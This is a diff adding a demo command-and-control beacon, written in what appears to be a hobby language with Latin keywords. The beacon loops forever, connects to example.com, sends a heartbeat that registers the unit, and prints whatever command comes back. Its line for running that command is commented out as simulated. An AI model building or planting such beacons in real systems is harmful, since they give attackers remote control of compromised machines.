@@ -1,0 +1,42 @@
+// ACHLYS C2 BEACON v1.0
+// Connects to a domain, sends heartbeat, waits for orders.
+
+vas c2_host : str -> "example.com"^ // DNS RESOLUTION WORKS NOW
+vas c2_port : int -> 80^
+
+scribo("⚔️  INITIATING C2 LINK TO: " + c2_host + "\n")^
+
+// 1. Connection Loop
+dum (1) {
+    // Try to connect
+    vas sock : int -> necto(c2_host, c2_port)^
+    
+    si (sock != -1) {
+        scribo("[+] BEACON CONNECTED\n")^
+        
+        // 2. Send Heartbeat
+        // HTTP GET request to registers the beacon
+        vas heartbeat : str -> "GET /beacon?id=UNIT_01 HTTP/1.1\r\nHost: " + c2_host + "\r\n\r\n"^
+        mitto(sock, heartbeat)^
+        
+        // 3. Receive Command
+        vas cmd : str -> recipio(sock, 1024)^
+        
+        si (mensura(cmd) > 0) {
+            scribo("[*] COMMAND RECEIVED\n")^
+            // In a real C2, we would parse the HTTP response to get the command
+            // For demo, we just print what the server said
+            scribo(cmd)^
+            
+            // Execute payload (simulated)
+            // sys(parsed_command)^
+        }^
+        
+        claudere(sock)^
+    } aliter {
+        scribo("[-] Connection failed. Retrying in 5s...\n")^
+    }^
+    
+    // Sleep 5 seconds (using system sleep)
+    sys("sleep 5")^
+}^
